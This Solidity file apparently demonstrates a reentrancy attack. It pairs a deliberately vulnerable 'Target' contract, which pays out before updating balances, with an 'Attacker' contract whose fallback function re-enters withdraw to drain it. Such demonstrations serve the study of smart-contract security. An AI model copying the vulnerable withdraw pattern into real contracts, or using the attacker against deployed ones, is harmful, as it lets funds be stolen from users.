pragma solidity ^0.4.25;

contract Target {
    mapping (address => uint) private userBalances;

    function withdraw(uint amount) public {
        require(userBalances[msg.sender] >= amount, "not enough balance");
        require(msg.sender.call.value(amount)(), "call failed");
        userBalances[msg.sender] -= amount;
    }
    
    function deposit() public payable {
        userBalances[msg.sender] += msg.value;
    }
    
    function getBalanceInEther() public view returns(uint) {
        return userBalances[msg.sender] / 1 ether;
    }
}

contract Attacker {
    Target public target;
    
    constructor() public payable {}
    
    function attack(address _targetAddr) {
        target = Target(_targetAddr);
        target.deposit.value(1 ether)();
        target.withdraw(1 ether);
    }
    
    function () payable {
        if (target.balance > 1 ether) {
            target.withdraw(1 ether);
        }
    }
    
    function getBalanceInEther() public view returns(uint) {
        return this.balance / 1 ether;
    }
}
